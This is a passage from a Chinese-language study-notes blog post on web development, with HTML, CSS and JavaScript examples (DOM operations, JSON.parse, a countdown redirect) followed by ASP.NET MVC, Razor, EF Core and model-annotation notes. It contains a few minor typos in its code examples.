class=\"attr\">href</span>=<span class=\"string\">&quot;#home&quot;</span>&gt;</span>主页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#news&quot;</span>&gt;</span>新闻<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#contact&quot;</span>&gt;</span>联系<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#about&quot;</span>&gt;</span>关于<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-class\">.nav</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">list-style-type</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:link</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:visited</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">        <span class=\"attribute\">width</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">        <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">        <span class=\"attribute\">padding</span>: <span class=\"number\">4px</span>;</span><br><span class=\"line\">        <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">        <span class=\"attribute\">background-color</span>: <span class=\"number\">#98bf21</span>;</span><br><span class=\"line\">        <span class=\"attribute\">text-decoration</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:active</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#7a991a</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>float:left</code>把图像像左浮动</li>\n<li><code>list-style-type</code>设置列表样式类型</li>\n<li><code>a:link</code>正常，未访问过的链接</li>\n<li><code>a:visited</code>用户已访问过的链接</li>\n<li><code>display:block</code>设置为块级元素</li>\n<li><code>text-align</code>设置文本对齐方式</li>\n<li><code>text-decoration</code>文本修饰</li>\n</ul>\n<h2 id=\"4-JavaScript\"><a href=\"#4-JavaScript\" class=\"headerlink\" title=\"4.JavaScript\"></a>4.JavaScript</h2><h4 id=\"◼-js基本特点\"><a href=\"#◼-js基本特点\" class=\"headerlink\" title=\"◼ js基本特点\"></a>◼ js基本特点</h4><ul>\n<li>JS是一种**<u>解释性脚本语言</u>**（代码不进行预编译，可在程序运行过程中逐行进行解释）</li>\n<li>JS是一种**<u>简单的弱类型脚本语</u>**言（未使用严格的数据类型</li>\n<li>JS是一种**<u>基于对象的语言</u>**（不仅可以创建对象，也能使用自身的对象或其他语言创建的对象）</li>\n<li>JS是一种**<u>跨平台脚本语言</u>**（不依赖于操作系统，仅需要浏览器的支持）</li>\n</ul>\n<h4 id=\"◼JS箭头函数\"><a href=\"#◼JS箭头函数\" class=\"headerlink\" title=\"◼JS箭头函数\"></a>◼JS箭头函数</h4><p><strong>匿名函数可进一步用箭头函数来简化（箭头函数用<code>=&gt;</code>定义，也成：lambda表达式</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> foo=<span class=\"keyword\">function</span>(<span class=\"params\">num</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a=<span class=\"title function_\">foo</span>(<span class=\"number\">100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//使用箭头函数</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"title function_\">foo</span> =(<span class=\"params\">num</span>)=&gt;num+<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>JS 数组操作：map、reduce、join、slice、splice、push、pop、shift、unshift 方法基本用法</strong></p>\n<p><strong>JS 程序：五秒倒计时，跳转到学校官网</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ok&quot;</span>&gt;</span>3秒后确定<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> btn=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;ok&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    btn.<span class=\"property\">disabled</span>=<span class=\"literal\">true</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> t=<span class=\"number\">3</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">count</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        t--;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        btn.<span class=\"property\">innerHTML</span>=t+<span class=\"string\">&quot;秒后确定&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">if</span>(t&lt;=<span class=\"number\">0</span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"built_in\">clearInterval</span>(id);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            btn.<span class=\"property\">disabled</span>=<span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            btn.<span class=\"property\">innerHTML</span>=<span class=\"string\">&quot;确定&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> url=<span class=\"variable language_\">window</span>.<span class=\"property\">location</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">window</span>.<span class=\"property\">loaction</span>=<span class=\"string\">&quot;https://www.wust.edu.cn&quot;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> id = <span class=\"built_in\">setInterval</span>(count,<span class=\"number\">1000</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>document.getElementById</code>方法可返回对拥有指定 ID 的第一个对象的引用</li>\n<li><code>btn.disabled</code>禁用</li>\n<li><code>btn.innerHTML</code> 属性设置或返回表格行的开始和结束标签之间的 HTML。</li>\n<li><code>setInterval</code>方法可按照指定的周期（以毫秒计）来调用函数或计算表达式</li>\n<li><code>clearInterval</code>方法可取消由 setInterval() 函数设定的定时执行操作</li>\n<li><code>window.loaction</code>页面跳转</li>\n</ul>\n<h4 id=\"◼DOM基本概念\"><a href=\"#◼DOM基本概念\" class=\"headerlink\" title=\"◼DOM基本概念\"></a>◼DOM基本概念</h4><p><strong>DOM:文档对象模型</strong></p>\n<p><strong>DOM是载入到浏览器中的文档模型，以节点树的形式来表现文档，每个节点代表文档的构成部分</strong></p>\n<h4 id=\"◼DOM常用操作\"><a href=\"#◼DOM常用操作\" class=\"headerlink\" title=\"◼DOM常用操作\"></a>◼DOM常用操作</h4><h5 id=\"1-查询操作\"><a href=\"#1-查询操作\" class=\"headerlink\" title=\"1.查询操作\"></a>1.查询操作</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;list&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> list = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;list&#x27;</span>) <span class=\"comment\">// 命中id=&quot;list&quot;的元素，注意不带#，不是css选择器</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(list.<span class=\"property\">innerHTML</span>) <span class=\"comment\">//查看元素的HTML内容</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> first = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;.item&#x27;</span>) <span class=\"comment\">// 命中第一个 class=&quot;item&quot; 参数为class选择器</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(first.<span class=\"property\">innerHTML</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> second = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;.item:nth-child(2)&#x27;</span>) <span class=\"comment\">// 命中第二个 .item 复杂的css选择器</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(second.<span class=\"property\">innerHTML</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> items = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&#x27;.item&#x27;</span>) <span class=\"comment\">// 获得包含所有 .item 的集合（NodeList）</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(items.<span class=\"property\">length</span>) <span class=\"comment\">//查看集合长度</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> el <span class=\"keyword\">of</span> items ) &#123; <span class=\"comment\">//遍历集合</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(el)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-创建操作：document-createElement\"><a href=\"#2-创建操作：document-createElement\" class=\"headerlink\" title=\"2.创建操作：document.createElement\"></a>2.创建操作：document.createElement</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;list&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> list = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;ul&#x27;</span>) <span class=\"comment\">//创建1个ul元素</span></span><br><span class=\"line\">list.<span class=\"property\">id</span> = <span class=\"string\">&#x27;list&#x27;</span> <span class=\"comment\">// 设置元素的id属性</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++ ) &#123;</span><br><span class=\"line\"><span class=\"keyword\">let</span> item = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;li&#x27;</span>) <span class=\"comment\">//循环创建3个li元素</span></span><br><span class=\"line\">item.<span class=\"property\">className</span> = <span class=\"string\">&#x27;item&#x27;</span> <span class=\"comment\">// 设置元素的class属性</span></span><br><span class=\"line\">item.<span class=\"property\">innerText</span> = <span class=\"string\">`<span class=\"subst\">$&#123;i + <span class=\"number\">1</span>&#125;</span>`</span> <span class=\"comment\">// 设置元素的innerText属性 (使用了模板字符串)</span></span><br><span class=\"line\">list.<span class=\"title function_\">appendChild</span>(item) <span class=\"comment\">// 将创建好的元素添加到父节点</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 将list添加到body</span></span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(list)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JSON对象定义基本特点\"><a href=\"#JSON对象定义基本特点\" class=\"headerlink\" title=\"JSON对象定义基本特点\"></a>JSON对象定义基本特点</h4><ul>\n<li><strong><u>数据在键值对中（键名即属性名必须加双引号）</u></strong></li>\n<li><strong><u>数据由逗号分隔</u></strong></li>\n<li><strong><u>花括号保存对象</u></strong></li>\n<li><strong><u>方括号保存数组</u></strong></li>\n</ul>\n<p><strong>JSON可通过JavaScript进行解析，JSON的值可以是：数字 字符串 逻辑值 数组 对象 null</strong></p>\n<p><strong>json不能存储Date对象，如果需要则用字符串表示</strong></p>\n<h4 id=\"JSON-parse程序示例：\"><a href=\"#JSON-parse程序示例：\" class=\"headerlink\" title=\"JSON.parse程序示例：\"></a>JSON.parse程序示例：</h4><p><strong>◼ JSON.parse(text [, reviver]) ：将JSON格式字符串转换为JavaScript对象</strong></p>\n<p><strong>◼ 参数说明：</strong></p>\n<ul>\n<li><code>text</code>：必需，一个有效的JSON字符串 (如格式不正确则解析会出错)</li>\n<li><code>reviver</code>：可选，一个转换结果的函数， 将为对象的每个成员调用此函数</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> jstr = <span class=\"string\">&#x27;&#123;&quot;name&quot;:&quot;wust&quot;, &quot;url&quot;:&quot;www.wust.edu.cn&quot;,&quot;birthday&quot;:&quot;1898-11-21&quot;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> obj = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>( jstr, <span class=\"keyword\">function</span>(<span class=\"params\">key, value</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (key == <span class=\"string\">&quot;birthday&quot;</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> diff = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>() - <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(value); <span class=\"comment\">//计算距今的毫秒数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> year = <span class=\"built_in\">parseInt</span>(diff / <span class=\"number\">1000</span> / <span class=\"number\">60</span> / <span class=\"number\">60</span> / <span class=\"number\">24</span> / <span class=\"number\">365</span>); <span class=\"comment\">//相差的年数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> year;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(jsonObj.<span class=\"property\">birthday</span>);</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"二-MVC后台部分\"><a href=\"#二-MVC后台部分\" class=\"headerlink\" title=\"二.MVC后台部分\"></a>二.MVC后台部分</h1><h4 id=\"1-MVC基本概念：\"><a href=\"#1-MVC基本概念：\" class=\"headerlink\" title=\"1.MVC基本概念：\"></a>1.MVC基本概念：</h4><ul>\n<li>MVC:是一种体系结构模式，他将应用程序分成3个主要组件：**<u>模型（Model）视图（View）和控制器（Controller）</u>**</li>\n<li>MVC模式有助于实现关注点分离：</li>\n<li>关注点：<strong>输入逻辑</strong> <strong>业务逻辑</strong> <strong>UI逻辑</strong></li>\n</ul>\n<h4 id=\"2-MVC三个模块功能\"><a href=\"#2-MVC三个模块功能\" class=\"headerlink\" title=\"2.MVC三个模块功能\"></a>2.MVC三个模块功能</h4><ul>\n<li>控制器C：处理浏览器的请求，决定如何调用业务层数据的增、删、改、查等业务操作，以及如何将结果返回给视图进行渲染。</li>\n<li>模型M：应用的实体类，用于在内存中暂时存储数据，并在数据变化时通知控制器。</li>\n<li>视图V：主要用来解析、处理、显示内容，并进行模板的渲染。</li>\n</ul>\n<h4 id=\"3-MVC体系结构优点：\"><a href=\"#3-MVC体系结构优点：\" class=\"headerlink\" title=\"3.MVC体系结构优点：\"></a>3.MVC体系结构优点：</h4><p>◼ Controller与View完全分离(松耦合)，有利于前、后台分工合作</p>\n<p>◼ 一个Model可建立多个视图，满足用户不同需求</p>\n<p>◼ Model独立于视图，可移植到新的平台，代码重用高，易于维护</p>\n<p>◼ 表现层的性能可以优化到极致</p>\n<p>◼ 容易对界面逻辑进行单元测试</p>\n<p>◼ 非常强大的URL映射组件，非常干净的URL来建造应用</p>\n<p>◼ 有利于软件工程化管理</p>\n<h4 id=\"4-MVC项目目录结构\"><a href=\"#4-MVC项目目录结构\" class=\"headerlink\" title=\"4.MVC项目目录结构\"></a>4.MVC项目目录结构</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451438.png\"\n                        alt=\"图片-1667485456621\"\n                 ></p>\n<h4 id=\"5-Razor基本概念和基本语法规则\"><a href=\"#5-Razor基本概念和基本语法规则\" class=\"headerlink\" title=\"5.Razor基本概念和基本语法规则\"></a>5.Razor基本概念和基本语法规则</h4><p><code>Razor概念</code>Razor是一个视图模板引擎，它提供了优雅的方法将基于服务器的代码（如C#）嵌入到HTML页面中</p>\n<p><code>Razor语法规则</code></p>\n<p>◼ C# 代码封装于 @{ … } 中</p>\n<p>◼ 代码语句以分号结尾</p>\n<p>◼ 行内表达式（变量和函数）以 @ 开头</p>\n<p>◼ C# 代码对大小写敏感</p>\n<h4 id=\"6-ViewData传值特点\"><a href=\"#6-ViewData传值特点\" class=\"headerlink\" title=\"6.ViewData传值特点\"></a>6.ViewData传值特点</h4><ul>\n<li>ViewData是一个字典对象，用来从Controller向对应的View视图传值</li>\n<li>ViewData只在当前请求中有效，生命周期和View相同，其值不能在多个请求中共享</li>\n<li>在重定向(新请求)后，ViewData存储的值将变为null</li>\n<li>使用ViewData值时必须进行合适的类型转换和建议空值检查</li>\n</ul>\n<h4 id=\"7-TrmpData传值特点\"><a href=\"#7-TrmpData传值特点\" class=\"headerlink\" title=\"7.TrmpData传值特点\"></a>7.TrmpData传值特点</h4><ul>\n<li>TempData也是一个字典对象，但是基于Session存储机制</li>\n<li>TempData用在多个Action间或页面重定向(Redirection)时传递共享数据</li>\n<li>但TempData存放的数据只一次访问中有效，一次访问完成后就会删除</li>\n<li>TempData用法和ViewData相同</li>\n</ul>\n<h4 id=\"8-“新搭建基架的项目”时生成的一些内容：\"><a href=\"#8-“新搭建基架的项目”时生成的一些内容：\" class=\"headerlink\" title=\"8.“新搭建基架的项目”时生成的一些内容：\"></a>8.“新搭建基架的项目”时生成的一些内容：</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451623.png\"\n                        alt=\"图片-1667485469907\"\n                 ></p>\n<h4 id=\"9-EF-Core数据库迁移两个命令：\"><a href=\"#9-EF-Core数据库迁移两个命令：\" class=\"headerlink\" title=\"9.EF Core数据库迁移两个命令：\"></a>9.EF Core数据库迁移两个命令：</h4><p>① <strong><u>Add-Migration InitialCreate</u></strong></p>\n<p>② <strong><u>Uppate-Database</u></strong></p>\n<h4 id=\"10-ORM的概念\"><a href=\"#10-ORM的概念\" class=\"headerlink\" title=\"10.ORM的概念\"></a>10.ORM的概念</h4><blockquote>\n<p>ORM (Object Relation Mapping) 是对象&#x2F;关系映射，它将内存中的对象和数据库中的立映射关系</p>\n</blockquote>\n<h4 id=\"11-ORM技术产生的背景原因\"><a href=\"#11-ORM技术产生的背景原因\" class=\"headerlink\" title=\"11.ORM技术产生的背景原因\"></a>11.ORM技术产生的背景原因</h4><p>◼ 面向对象开发方法是当今企业级应用主流开发方法。</p>\n<p>◼ 关系数据库是企业级应用永久存放数据的主流数据存储系统。</p>\n<p>◼ 对象和关系数据是业务实体两种表现形式：业务实体在内存中表现为对象(非持久化存储)，在数据库中表</p>\n<p>现为关系数据(持久化存储) 。</p>\n<p>◼ 需要一种技术实现二者间映射，以简化编程，提高系统效率 </p>\n<h4 id=\"12-模型的一些DateType注解\"><a href=\"#12-模型的一些DateType注解\" class=\"headerlink\" title=\"12.模型的一些DateType注解\"></a>12.模型的一些DateType注解</h4><table>\n<thead>\n<tr>\n<th align=\"center\">DataType类型值</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DataType.Currency</td>\n<td align=\"center\">表示货币值</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Date</td>\n<td align=\"center\">表示日期值</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.EmailAddress</td>\n<td align=\"center\">表示电子邮件地址</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Multiline Text</td>\n<td align=\"center\">表示多行文本</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Password</td>\n<td align=\"center\">表示密码值</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Time</td>\n<td align=\"center\">表示时间值</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Url</td>\n<td align=\"center\">表示一个URL值</td>\n</tr>\n</tbody></table>\n<h4 id=\"13-模型的一些验证注解\"><a href=\"#13-模型的一些验证注解\" class=\"headerlink\" title=\"13.模型的一些验证注解\"></a>13.模型的一些验证注解</h4><p>◼ <code>[Required]</code>：验证字段是否不为 null</p>\n<p>◼ <code>[StringLength]</code>：验证字符串属性值是否不超过指定的长度限制。</p>\n<p>◼ <code>[Range]</code>：验证属性值是否位于指定范围内。</p>\n<p>◼ <code>[Compare]</code>：验证模型中的两个属性是否匹配。</p>\n<p>◼ <code>[RegularExpression]</code>：验证 属性值是否与指定的正则表达式匹配。</p>\n<p>◼ 